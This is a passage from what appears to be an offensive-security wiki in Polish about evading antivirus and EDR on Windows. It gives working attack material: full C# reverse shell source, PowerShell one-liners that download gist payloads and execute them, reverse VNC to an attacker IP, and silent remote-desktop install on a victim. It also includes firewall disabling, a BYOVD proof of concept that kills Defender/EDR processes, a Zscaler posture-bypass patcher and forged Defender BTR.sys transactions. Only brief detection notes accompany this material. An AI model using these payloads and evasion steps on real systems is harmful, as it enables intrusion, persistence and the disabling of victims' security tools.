3.  Usuwanie proxy calls – ConfuserEx zastępuje bezpośrednie wywołania metod lekkimi wrapperami (tzw. *proxy calls*), aby dodatkowo utrudnić dekompilację. Usuń je za pomocą **ProxyCall-Remover**:
```bash
ProxyCall-Remover.exe Confused.de4dot.exe Confused.fixed.exe
```
Po tym kroku zamiast nieprzejrzystych funkcji wrapperów (`Class8.smethod_10`, …) powinieneś zobaczyć standardowe API .NET, takie jak `Convert.FromBase64String` lub `AES.Create()`.

4.  Ręczne czyszczenie – uruchom wynikowy plik binarny w dnSpy, wyszukaj duże bloby Base64 lub użycie `RijndaelManaged`/`TripleDESCryptoServiceProvider`, aby zlokalizować *prawdziwy* payload. Często malware przechowuje go jako tablicę bajtów zakodowaną w formacie TLV, inicjalizowaną wewnątrz `<Module>.byte_0`.

Powyższy łańcuch przywraca przepływ wykonywania **bez konieczności uruchamiania złośliwego sample'a** – jest to przydatne podczas pracy na workstationie offline.

> 🛈  ConfuserEx tworzy custom attribute o nazwie `ConfusedByAttribute`, którego można użyć jako IOC do automatycznego triage'owania sampli.

#### One-liner
```bash
autotok.sh Confused.exe  # wrapper that performs the 3 steps above sequentially
```
---

- [**InvisibilityCloak**](https://github.com/h4wkst3r/InvisibilityCloak)**: obfuscator C#**
- [**Obfuscator-LLVM**](https://github.com/obfuscator-llvm/obfuscator): Celem tego projektu jest dostarczenie open-source'owego forka pakietu kompilacyjnego [LLVM](http://www.llvm.org/), który zapewnia zwiększone bezpieczeństwo software'u dzięki [code obfuscation](<http://en.wikipedia.org/wiki/Obfuscation_(software)>) i zabezpieczeniu przed modyfikacją.
- [**ADVobfuscator**](https://github.com/andrivet/ADVobfuscator): ADVobfuscator demonstruje, jak używać języka `C++11/14` do generowania, w czasie kompilacji, obfuscated code bez używania zewnętrznych narzędzi i bez modyfikowania kompilatora.
- [**obfy**](https://github.com/fritzone/obfy): Dodaje warstwę obfuscated operations generowanych przez framework C++ template metaprogramming, co nieco utrudni życie osobie próbującej złamać aplikację.
- [**Alcatraz**](https://github.com/weak1337/Alcatraz)**:** Alcatraz to obfuscator binariów x64, który potrafi obfuscate różne pliki PE, w tym: .exe, .dll, .sys
- [**metame**](https://github.com/a0rtega/metame): Metame to prosty silnik metamorphic code dla dowolnych plików wykonywalnych.
- [**ropfuscator**](https://github.com/ropfuscator/ropfuscator): ROPfuscator to fine-grained code obfuscation framework dla języków obsługiwanych przez LLVM, wykorzystujący ROP (return-oriented programming). ROPfuscator obfuscates program na poziomie kodu assembly, przekształcając standardowe instrukcje w łańcuchy ROP i udaremniając nasze naturalne postrzeganie normalnego przepływu sterowania.
- [**Nimcrypt**](https://github.com/icyguider/nimcrypt): Nimcrypt to .NET PE Crypter napisany w Nim
- [**inceptor**](https://github.com/klezVirus/inceptor)**:** Inceptor potrafi konwertować istniejące pliki EXE/DLL do shellcode, a następnie je ładować

## SmartScreen & MoTW

Być może widziałeś ten ekran podczas pobierania niektórych plików wykonywalnych z internetu i ich uruchamiania.

Microsoft Defender SmartScreen to mechanizm bezpieczeństwa mający chronić użytkownika końcowego przed uruchamianiem potencjalnie złośliwych aplikacji.

<figure><img src="../images/image (664).png" alt=""><figcaption></figcaption></figure>

SmartScreen działa głównie w oparciu o reputację, co oznacza, że rzadko pobierane aplikacje wywołają SmartScreen, ostrzegając użytkownika końcowego i uniemożliwiając mu uruchomienie pliku (plik nadal można uruchomić, klikając More Info -> Run anyway).

**MoTW** (Mark of The Web) to [NTFS Alternate Data Stream](<https://en.wikipedia.org/wiki/NTFS#Alternate_data_stream_(ADS)>) o nazwie Zone.Identifier, który jest automatycznie tworzony podczas pobierania plików z internetu wraz z adresem URL, z którego plik został pobrany.

<figure><img src="../images/image (237).png" alt=""><figcaption><p>Sprawdzanie ADS Zone.Identifier dla pliku pobranego z internetu.</p></figcaption></figure>

> [!TIP]
> Należy pamiętać, że pliki wykonywalne podpisane **zaufanym** certyfikatem podpisu **nie wywołają SmartScreen**.

Bardzo skutecznym sposobem zapobiegania otrzymywaniu przez payloads oznaczenia Mark of The Web jest umieszczanie ich wewnątrz pewnego rodzaju kontenera, takiego jak ISO. Dzieje się tak, ponieważ Mark-of-the-Web (MOTW) **nie może** zostać zastosowany do woluminów **innych niż NTFS**.

<figure><img src="../images/image (640).png" alt=""><figcaption></figcaption></figure>

[**PackMyPayload**](https://github.com/mgeeky/PackMyPayload/) to narzędzie, które pakuje payloads do kontenerów wyjściowych w celu ominięcia Mark-of-the-Web.

Przykładowe użycie:
```bash
PS C:\Tools\PackMyPayload> python .\PackMyPayload.py .\TotallyLegitApp.exe container.iso

+      o     +              o   +      o     +              o
+             o     +           +             o     +         +
o  +           +        +           o  +           +          o
-_-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-_-_-_-_-_-_-_,------,      o
:: PACK MY PAYLOAD (1.1.0)       -_-_-_-_-_-_-|   /\_/\
for all your container cravings   -_-_-_-_-_-~|__( ^ .^)  +    +
-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-__-_-_-_-_-_-_-''  ''
+      o         o   +       o       +      o         o   +       o
+      o            +      o    ~   Mariusz Banach / mgeeky    o
o      ~     +           ~          <mb [at] binary-offensive.com>
o           +                         o           +           +

[.] Packaging input file to output .iso (iso)...
Burning file onto ISO:
Adding file: /TotallyLegitApp.exe

[+] Generated file written to (size: 3420160): container.iso
```
Oto przykład obejścia SmartScreen przez umieszczanie payloadów w plikach ISO za pomocą [PackMyPayload](https://github.com/mgeeky/PackMyPayload/)

<figure><img src="../images/packmypayload_demo.gif" alt=""><figcaption></figcaption></figure>

## ETW

Event Tracing for Windows (ETW) to zaawansowany mechanizm logowania w Windows, który umożliwia aplikacjom i komponentom systemu **rejestrowanie zdarzeń**. Może być jednak również używany przez produkty bezpieczeństwa do monitorowania i wykrywania złośliwych działań.

Podobnie jak AMSI można wyłączyć (obejść), możliwe jest również sprawienie, aby funkcja **`EtwEventWrite`** procesu działającego w user space natychmiast zwracała wynik bez rejestrowania żadnych zdarzeń. Osiąga się to przez spatchowanie funkcji w pamięci tak, aby natychmiast zwracała wynik, skutecznie wyłączając logowanie ETW dla tego procesu.

Więcej informacji znajdziesz w **[https://blog.xpnsec.com/hiding-your-dotnet-etw/](https://blog.xpnsec.com/hiding-your-dotnet-etw/) oraz [https://github.com/repnz/etw-providers-docs/](https://github.com/repnz/etw-providers-docs/)**.<sup>[[33]](#references)[[34]](#references)</sup>


## C# Assembly Reflection

Ładowanie plików binarnych C# do pamięci jest znane od dłuższego czasu i nadal stanowi bardzo dobry sposób uruchamiania narzędzi post-exploitation bez wykrycia przez AV.

Ponieważ payload zostanie załadowany bezpośrednio do pamięci, bez zapisywania na dysku, będziemy musieli martwić się jedynie o spatchowanie AMSI dla całego procesu.

Większość frameworków C2 (sliver, Covenant, metasploit, CobaltStrike, Havoc itd.) oferuje już możliwość wykonywania assembly C# bezpośrednio w pamięci, ale można to zrobić na różne sposoby:

- **Fork\&Run**

Polega to na **uruchomieniu nowego procesu sacrificial**, wstrzyknięciu złośliwego kodu post-exploitation do tego procesu, wykonaniu złośliwego kodu, a po zakończeniu — zakończeniu nowego procesu. Ma to zarówno zalety, jak i wady. Zaletą metody fork and run jest to, że wykonanie odbywa się **poza procesem naszego implantu Beacon**. Oznacza to, że jeśli coś pójdzie nie tak podczas działania post-exploitation lub zostanie wykryte, istnieje **znacznie większa szansa**, że nasz **implant przetrwa**. Wadą jest **większe prawdopodobieństwo** wykrycia przez **Behavioural Detections**.

<figure><img src="../images/image (215).png" alt=""><figcaption></figcaption></figure>

- **Inline**

Polega to na wstrzyknięciu złośliwego kodu post-exploitation **do jego własnego procesu**. W ten sposób można uniknąć konieczności tworzenia nowego procesu i skanowania go przez AV, ale wadą jest to, że jeśli coś pójdzie nie tak podczas wykonywania payloadu, istnieje **znacznie większa szansa** na **utratę beacona**, ponieważ może dojść do crashu.

<figure><img src="../images/image (1136).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Jeśli chcesz dowiedzieć się więcej o ładowaniu C# Assembly, przeczytaj ten artykuł [https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/](https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/) oraz zapoznaj się z ich InlineExecute-Assembly BOF ([https://github.com/xforcered/InlineExecute-Assembly](https://github.com/xforcered/InlineExecute-Assembly))

Możesz również ładować C# Assemblies **z PowerShell**. Sprawdź [Invoke-SharpLoader](https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader) oraz [wideo S3cur3th1sSh1t](https://www.youtube.com/watch?v=oe11Q-3Akuk).

## Using Other Programming Languages

Jak opisano w [**https://github.com/deeexcee-io/LOI-Bins**](https://github.com/deeexcee-io/LOI-Bins), możliwe jest wykonywanie złośliwego kodu przy użyciu innych języków poprzez zapewnienie zaatakowanej maszynie dostępu **do środowiska interpretera zainstalowanego na kontrolowanym przez Attackera udziale SMB**.

Zapewniając dostęp do plików binarnych interpretera i środowiska na udziale SMB, można **wykonywać dowolny kod w tych językach w pamięci** zaatakowanej maszyny.

Repozytorium wskazuje, że Defender nadal skanuje skrypty, ale wykorzystanie Go, Java, PHP itd. zapewnia **większą elastyczność w omijaniu statycznych sygnatur**. Testy z losowymi, nieobfuskowanymi skryptami reverse shell w tych językach zakończyły się powodzeniem.

## TokenStomping

Token stomping manipuluje access tokenem produktu bezpieczeństwa, takiego jak EDR lub AV. Ograniczenie uprawnień tokena może pozostawić proces uruchomiony, jednocześnie uniemożliwiając mu wykonywanie uprzywilejowanych działań inspekcyjnych lub naprawczych.

Aby temu zapobiec, Windows mógłby **uniemożliwić procesom zewnętrznym** uzyskiwanie handlei do tokenów procesów bezpieczeństwa.

- [**https://github.com/pwn1sher/KillDefender/**](https://github.com/pwn1sher/KillDefender/)
- [**https://github.com/MartinIngesen/TokenStomp**](https://github.com/MartinIngesen/TokenStomp)
- [**https://github.com/nick-frischkorn/TokenStripBOF**](https://github.com/nick-frischkorn/TokenStripBOF)

## Using Trusted Software

### Chrome Remote Desktop

Jak opisano w [**tym wpisie na blogu**](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide), łatwo jest wdrożyć Chrome Remote Desktop na komputerze ofiary, a następnie użyć go do przejęcia nad nim kontroli i utrzymania persistence:<sup>[[35]](#references)</sup>
1. Pobierz plik ze strony https://remotedesktop.google.com/, kliknij „Set up via SSH”, a następnie kliknij plik MSI dla Windows, aby go pobrać.
2. Uruchom instalator po cichu na komputerze ofiary (wymagane uprawnienia administratora): `msiexec /i chromeremotedesktophost.msi /qn`
3. Wróć do strony Chrome Remote Desktop i kliknij Next. Kreator poprosi następnie o autoryzację; kliknij przycisk Authorize, aby kontynuować.
4. Wykonaj dostarczone polecenie, wprowadzając wymagane zmiany: `"%PROGRAMFILES(X86)%\Google\Chrome Remote Desktop\CurrentVersion\remoting_start_host.exe" --code="YOUR_UNIQUE_CODE" --redirect-url="https://remotedesktop.google.com/_/oauthredirect" --name=%COMPUTERNAME% --pin=111111` (parametr `--pin` ustawia PIN bez korzystania z GUI).


## Advanced Evasion

Evasion to bardzo złożony temat. Czasami trzeba uwzględnić wiele różnych źródeł telemetrii w jednym systemie, dlatego w dojrzałych środowiskach całkowite pozostanie niewykrytym jest praktycznie niemożliwe.

Każde środowisko, z którym będziesz się mierzyć, będzie miało własne mocne i słabe strony.

Gorąco zachęcam do obejrzenia tego wystąpienia [@ATTL4S](https://twitter.com/DaniLJ94), aby uzyskać punkt wyjścia do bardziej zaawansowanych technik Evasion.


{{#ref}}
https://vimeo.com/502507556?embedded=true&owner=32913914&source=vimeo_logo
{{#endref}}

To także kolejne świetne wystąpienie [@mariuszbit](https://twitter.com/mariuszbit) dotyczące Evasion in Depth.


{{#ref}}
https://www.youtube.com/watch?v=IbA7Ung39o4
{{#endref}}

## **Old Techniques**

### **Check which parts Defender finds as malicious**

Możesz użyć narzędzia [**ThreatCheck**](https://github.com/rasta-mouse/ThreatCheck), które będzie **usuwać fragmenty pliku binarnego**, aż **ustali, który fragment Defender** rozpoznaje jako złośliwy, a następnie wyodrębni go dla ciebie.\
Innym narzędziem wykonującym **to samo zadanie jest** [**avred**](https://github.com/dobin/avred), które oferuje tę usługę w otwartej wersji webowej pod adresem [**https://avred.r00ted.ch/**](https://avred.r00ted.ch/)

### **Telnet Server**

Do czasu Windows10 każdy system Windows zawierał **Telnet server**, który można było zainstalować (jako administrator), wykonując:
```bash
pkgmgr /iu:"TelnetServer" /quiet
```
Niech **uruchamia się** przy starcie systemu i **uruchom** ją teraz:
```bash
sc config TlntSVR start= auto obj= localsystem
```
**Zmień port telnetu** (ukrycie) i wyłącz zaporę:
```
tlntadmn config port=80
netsh advfirewall set allprofiles state off
```
### UltraVNC

Pobierz je z: [http://www.uvnc.com/downloads/ultravnc.html](http://www.uvnc.com/downloads/ultravnc.html) (potrzebne są pliki bin, a nie instalator)

**NA HOŚCIE**: Uruchom _**winvnc.exe**_ i skonfiguruj server:

- Włącz opcję _Disable TrayIcon_
- Ustaw hasło w _VNC Password_
- Ustaw hasło w _View-Only Password_

Następnie przenieś plik binarny _**winvnc.exe**_ oraz **nowo** utworzony plik _**UltraVNC.ini**_ na **victim**

#### **Reverse connection**

**attacker** powinien **uruchomić wewnątrz** swojego **hosta** plik binarny `vncviewer.exe -listen 5900`, aby był **przygotowany** do przechwycenia zwrotnego **VNC connection**. Następnie, na **victim**: Uruchom daemon winvnc `winvnc.exe -run` i wykonaj `winwnc.exe [-autoreconnect] -connect <attacker_ip>::5900`

**OSTRZEŻENIE:** Aby zachować stealth, nie należy wykonywać kilku czynności

- Nie uruchamiaj `winvnc`, jeśli już działa, ponieważ wywołasz [popup](https://i.imgur.com/1SROTTl.png). Sprawdź, czy działa, za pomocą `tasklist | findstr winvnc`
- Nie uruchamiaj `winvnc` bez pliku `UltraVNC.ini` w tym samym katalogu, ponieważ spowoduje to otwarcie [okna konfiguracji](https://i.imgur.com/rfMQWcf.png)
- Nie uruchamiaj `winvnc -h`, aby uzyskać pomoc, ponieważ wywołasz [popup](https://i.imgur.com/oc18wcu.png)

### GreatSCT

Pobierz je z: [https://github.com/GreatSCT/GreatSCT](https://github.com/GreatSCT/GreatSCT)
```
git clone https://github.com/GreatSCT/GreatSCT.git
cd GreatSCT/setup/
./setup.sh
cd ..
./GreatSCT.py
```
W GreatSCT:
```
use 1
list #Listing available payloads
use 9 #rev_tcp.py
set lhost 10.10.14.0
sel lport 4444
generate #payload is the default name
#This will generate a meterpreter xml and a rcc file for msfconsole
```
Teraz **uruchom lister** za pomocą `msfconsole -r file.rc` i **wykonaj** **xml payload** za pomocą:
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe payload.xml
```
**Obecny Defender bardzo szybko zakończy proces.**

### Kompilowanie własnego reverse shell

https://medium.com/@Bank_Security/undetectable-c-c-reverse-shells-fab4c0ec4f15

#### Pierwszy C# Revershell

Skompiluj go za pomocą:
```
c:\windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /t:exe /out:back2.exe C:\Users\Public\Documents\Back1.cs.txt
```
Użyj tego z:
```
back.exe <ATTACKER_IP> <PORT>
```

```csharp
// From https://gist.githubusercontent.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc/raw/1b6c32ef6322122a98a1912a794b48788edf6bad/Simple_Rev_Shell.cs
using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;


namespace ConnectBack
{
public class Program
{
static StreamWriter streamWriter;

public static void Main(string[] args)
{
using(TcpClient client = new TcpClient(args[0], System.Convert.ToInt32(args[1])))
{
using(Stream stream = client.GetStream())
{
using(StreamReader rdr = new StreamReader(stream))
{
streamWriter = new StreamWriter(stream);

StringBuilder strInput = new StringBuilder();

Process p = new Process();
p.StartInfo.FileName = "cmd.exe";
p.StartInfo.CreateNoWindow = true;
p.StartInfo.UseShellExecute = false;
p.StartInfo.RedirectStandardOutput = true;
p.StartInfo.RedirectStandardInput = true;
p.StartInfo.RedirectStandardError = true;
p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
p.Start();
p.BeginOutputReadLine();

while(true)
{
strInput.Append(rdr.ReadLine());
//strInput.Append("\n");
p.StandardInput.WriteLine(strInput);
strInput.Remove(0, strInput.Length);
}
}
}
}
}

private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
{
StringBuilder strOutput = new StringBuilder();

if (!String.IsNullOrEmpty(outLine.Data))
{
try
{
strOutput.Append(outLine.Data);
streamWriter.WriteLine(strOutput);
streamWriter.Flush();
}
catch (Exception err) { }
}
}

}
}
```
### C# z użyciem kompilatora
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt.txt REV.shell.txt
```
[REV.txt: https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066](https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066)

[REV.shell: https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639](https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639)

Automatyczne pobieranie i wykonanie:
```csharp
64bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell

32bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell
```
{{#ref}}
https://gist.github.com/BankSecurity/469ac5f9944ed1b8c39129dc0037bb8f
{{#endref}}

Lista obfuscatorów C#: [https://github.com/NotPrab/.NET-Obfuscator](https://github.com/NotPrab/.NET-Obfuscator)

### C++
```
sudo apt-get install mingw-w64

i686-w64-mingw32-g++ prometheus.cpp -o prometheus.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
```
- [https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp](https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp)
- [https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/](https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/)
- [https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf)
- [https://github.com/l0ss/Grouper2](https://github.com/l0ss/Grouper2)
- [http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html](http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html)
- [http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/](http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/)

### Przykład użycia Pythona do budowania injectorów:

- [https://github.com/cocomelonc/peekaboo](https://github.com/cocomelonc/peekaboo)

### Inne narzędzia
```bash
# Veil Framework:
https://github.com/Veil-Framework/Veil

# Shellter
https://www.shellterproject.com/download/

# Sharpshooter
# https://github.com/mdsecactivebreach/SharpShooter
# Javascript Payload Stageless:
SharpShooter.py --stageless --dotnetver 4 --payload js --output foo --rawscfile ./raw.txt --sandbox 1=contoso,2,3

# Stageless HTA Payload:
SharpShooter.py --stageless --dotnetver 2 --payload hta --output foo --rawscfile ./raw.txt --sandbox 4 --smuggle --template mcafee

# Staged VBS:
SharpShooter.py --payload vbs --delivery both --output foo --web http://www.foo.bar/shellcode.payload --dns bar.foo --shellcode --scfile ./csharpsc.txt --sandbox 1=contoso --smuggle --template mcafee --dotnetver 4

# Donut:
https://github.com/TheWover/donut

# Vulcan
https://github.com/praetorian-code/vulcan
```
### Więcej

- [https://github.com/Seabreg/Xeexe-TopAntivirusEvasion](https://github.com/Seabreg/Xeexe-TopAntivirusEvasion)

## Bring Your Own Vulnerable Driver (BYOVD) – Wyłączanie AV/EDR z przestrzeni kernela

Storm-2603 wykorzystał małe narzędzie konsolowe znane jako **Antivirus Terminator** do wyłączenia zabezpieczeń endpointów przed wdrożeniem ransomware. Narzędzie dostarcza **własny podatny, ale *podpisany* driver** i nadużywa go do wykonywania uprzywilejowanych operacji w kernelu, których nie mogą zablokować nawet usługi AV typu Protected-Process-Light (PPL).<sup>[[12]](#references)</sup>

Najważniejsze informacje
1. **Podpisany driver**: Plik dostarczany na dysk to `ServiceMouse.sys`, ale binarnie jest to legalnie podpisany driver `AToolsKrnl64.sys` firmy Antiy Labs z „System In-Depth Analysis Toolkit”. Ponieważ driver posiada prawidłowy podpis Microsoft, ładuje się nawet przy włączonym Driver-Signature-Enforcement (DSE).
2. **Instalacja usługi**:
```powershell
sc create ServiceMouse type= kernel binPath= "C:\Windows\System32\drivers\ServiceMouse.sys"
sc start  ServiceMouse
```
Pierwszy wiersz rejestruje driver jako **usługę kernela**, a drugi uruchamia go, dzięki czemu `\\.\ServiceMouse` staje się dostępny z poziomu user land.
3. **IOCTLs udostępniane przez driver**
| Kod IOCTL | Możliwość                              |
|-----------:|-----------------------------------------|
| `0x99000050` | Zakończenie dowolnego procesu według PID (używane do zabijania usług Defender/EDR) |
| `0x990000D0` | Usunięcie dowolnego pliku z dysku |
| `0x990001D0` | Wyładowanie drivera i usunięcie usługi |

Minimalny proof-of-concept w C:
```c
#include <windows.h>

int main(int argc, char **argv){
DWORD pid = strtoul(argv[1], NULL, 10);
HANDLE hDrv = CreateFileA("\\\\.\\ServiceMouse", GENERIC_READ|GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
DeviceIoControl(hDrv, 0x99000050, &pid, sizeof(pid), NULL, 0, NULL, NULL);
CloseHandle(hDrv);
return 0;
}
```
4. **Dlaczego to działa**: BYOVD całkowicie omija zabezpieczenia user-mode; kod wykonywany w kernelu może otwierać *chronione* procesy, kończyć ich działanie lub manipulować obiektami kernela niezależnie od PPL/PP, ELAM i innych funkcji hardeningu.

Wykrywanie / ograniczanie skutków
•  Włącz listę blokowanych podatnych driverów Microsoftu (`HVCI`, `Smart App Control`), aby Windows odmówił załadowania `AToolsKrnl64.sys`.
•  Monitoruj tworzenie nowych usług *kernela* i generuj alerty, gdy driver jest ładowany z katalogu z prawem zapisu dla wszystkich użytkowników lub nie znajduje się na allow-liście.
•  Obserwuj uchwyty user-mode do niestandardowych obiektów urządzeń, po których następują podejrzane wywołania `DeviceIoControl`.

### Omijanie kontroli Posture w Zscaler Client Connector przez patchowanie binariów na dysku

**Client Connector** firmy Zscaler stosuje lokalnie reguły device-posture i korzysta z Windows RPC do komunikacji wyników z innymi komponentami. Dwie słabe decyzje projektowe umożliwiają pełny bypass:

1. Ocena posture odbywa się **w całości po stronie klienta** (do serwera wysyłana jest wartość boolean).
2. Wewnętrzne endpointy RPC sprawdzają wyłącznie, czy łączący się executable jest **podpisany przez Zscaler** (za pomocą `WinVerifyTrust`).<sup>[[11]](#references)</sup>

Przez **patchowanie czterech podpisanych binariów na dysku** można zneutralizować oba mechanizmy:

| Binary | Oryginalna logika poddana patchowaniu | Rezultat |
|--------|------------------------|---------|
| `ZSATrayManager.exe` | `devicePostureCheck() → return 0/1` | Zawsze zwraca `1`, więc każda kontrola kończy się zgodnością |
| `ZSAService.exe` | Pośrednie wywołanie `WinVerifyTrust` | NOP-ed ⇒ dowolny proces (nawet niepodpisany) może połączyć się z pipe’ami RPC |
| `ZSATrayHelper.dll` | `verifyZSAServiceFileSignature()` | Zastąpione przez `mov eax,1 ; ret` |
| `ZSATunnel.exe` | Kontrole integralności tunelu | Pomijane przez short-circuit |

Fragment minimalnego patchera:
```python
pattern = bytes.fromhex("44 89 AC 24 80 02 00 00")
replacement = bytes.fromhex("C6 84 24 80 02 00 00 01")  # force result = 1

with open("ZSATrayManager.exe", "r+b") as f:
data = f.read()
off = data.find(pattern)
if off == -1:
print("pattern not found")
else:
f.seek(off)
f.write(replacement)
```
Po zastąpieniu oryginalnych plików i ponownym uruchomieniu stosu usług:

* **Wszystkie** kontrole stanu wyświetlają kolor **zielony/zgodny**.
* Niepodpisane lub zmodyfikowane pliki binarne mogą otwierać endpointy RPC nazwanych potoków (np. `\\RPC Control\\ZSATrayManager_talk_to_me`).
* Naruszony host uzyskuje nieograniczony dostęp do sieci wewnętrznej zdefiniowanej przez zasady Zscaler.

To case study pokazuje, jak decyzje dotyczące zaufania podejmowane wyłącznie po stronie klienta oraz proste kontrole sygnatur mogą zostać pokonane za pomocą kilku patchy bajtowych.

## Nadużycie zaufanej funkcjonalności Microsoft Defender `BTR.sys`

Sterownik **Boot-Time Removal** programu Defender jest użytecznym przeciwieństwem klasycznego BYOVD. `BTR.sys` to legalny, podpisany przez Microsoft komponent naprawczy, pozbawiony błędu korupcji pamięci i interfejsu IOCTL; po uzyskaniu dostępu administratora oraz `SeLoadDriverPrivilege` operator może zamiast tego sfałszować jego prywatną transakcję naprawczą i uzyskać zamierzone operacje na plikach/rejestrze w Ring-0. Jest to **primitive neutralizacji AV/EDR po kompromitacji, a nie initial access ani privilege escalation**, a sterownik można wyodrębnić z własnego `MpEngine.dll` celu, z zasobu `BOOTTIMETOOL`, zamiast importować rzucający się w oczy sterownik innej firmy.<sup>[[36]](#references)</sup>

### Przygotowanie sterownika jednorazowego użycia

Defender zwykle zapisuje zasób jako losowy plik `[a-z]{8}.sys` i rejestruje usługę jądra o podobnej nazwie. `DriverEntry` odczytuje wartość `Args` usługi, otwiera wskazany NTFS ADS, odszyfrowuje i weryfikuje listę akcji, zapisuje informacje zwrotne i po pomyślnym wykonaniu zwraca `0xC0000056` (`STATUS_DELETE_PENDING`), dzięki czemu sterownik zostaje wyładowany zamiast pozostać rezydentny. Sfałszowana usługa ma następujące charakterystyczne wartości.<sup>[[36]](#references)[[37]](#references)</sup>
```text
Type         = 1
Start        = 1
ErrorControl = 0
ImagePath    = \??\C:\Windows\System32\drivers\<random>.sys
Group        = Boot Bus Extender
Args         = C:\Windows\System32\drivers\<random>.sys:changelist
```
Strumień `:changelist` zawiera jeden zaszyfrowany za pomocą RC4 blob. Analizowane buildy ponownie wykorzystują stały klucz o długości 256 bajtów, dlatego szyfrowanie nie stanowi granicy autoryzacji. Prawidłowy plaintext zawiera 24-bajtowy globalny nagłówek (`Magic=0xFEE1DEAD`, `Version=2`, `PayloadOffset=0x10`, CRC nagłówka oraz identyfikator transakcji wyprowadzony z payloadu), po którym następuje zakończona bajtem null ścieżka feedbacku w UTF-16 oraz dowolna liczba elementów. Każdy element ma 16-bajtowy nagłówek (`DataSize`, `Action`, `HeaderCRC`, `DataCRC`) oraz dane zależne od akcji, zakończone **dokładnie czterema bajtami NUL**. Każdy obszar nagłówka i danych jest niezależnie sprawdzany za pomocą CRC-32 z wielomianem `0xEDB88320`, stanem początkowym `0xFFFFFFFF` i **bez końcowego XOR** (`~CRC32`); stan CRC jest resetowany dla każdego obszaru.<sup>[[36]](#references)[[37]](#references)</sup>

Akceptowane identyfikatory akcji udostępniają te prymitywy kernela.<sup>[[36]](#references)[[37]](#references)</sup>

| ID | Dane elementu | Wynik |
| --- | --- | --- |
| 1 | `[UTF-16 path]` | Usunięcie pliku, w tym zablokowanego pliku |
| 2 | `[UTF-16 path]` | Usunięcie pustego katalogu |
| 3 | `[Flags][source][destination]` | Przeniesienie pliku do wybranej przez atakującego chronionej ścieżki; puste miejsce docelowe oznacza usunięcie |
| 4 | `[Flags][key path]` | Rekurencyjne usunięcie klucza rejestru |
| 5 | `[Flags][key path + "\\" + value]` | Usunięcie wartości rejestru |
| 6 | `[Flags][type][size][key path + "\\" + value][data]` | Utworzenie lub aktualizacja wartości rejestru oraz utworzenie brakujących ścieżek kluczy |

W przypadku akcji 5 i 6 separatorem klucza/wartości w formacie on-wire są **dwa kolejne backslashe**; ścieżka sformatowana konwencjonalnie nie zostanie poprawnie podzielona. Plik feedbacku w większości odzwierciedla żądanie, ale pierwsze cztery bajty danych każdego elementu stają się jego wynikowym `NTSTATUS`. W przypadku akcji 1 i 2, które nie mają pola flags na początku, BTR przesuwa ścieżkę do czterech zarezerwowanych końcowych bajtów, aby zrobić miejsce na ten status.<sup>[[36]](#references)</sup>

### Workflow `BTR_CLI` i okno wczesnego rozruchu

